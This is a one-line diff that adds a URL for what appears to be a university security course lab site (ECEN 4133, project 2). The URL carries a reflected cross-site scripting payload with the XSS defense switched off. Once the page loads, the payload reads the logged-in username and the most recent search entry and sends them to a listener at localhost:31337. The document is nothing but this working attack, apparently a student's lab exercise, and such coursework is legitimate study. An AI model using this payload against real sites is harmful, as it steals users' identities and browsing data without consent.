@@ -1,0 +1,1 @@
+https://project2.ecen4133.org/search?q=%3Cscript%3Edocument.addEventListener(%27DOMContentLoaded%27,%20function(event){$.get(%20%22http://localhost:31337/%22,%20{%20stolen_user:document.getElementById(%22logged-in-user%22).innerHTML,last_search:document.getElementById(%22history-list%22).getElementsByTagName(%27a%27)[1].innerHTML}%20)})%3C/script%3E&xssdefense=0
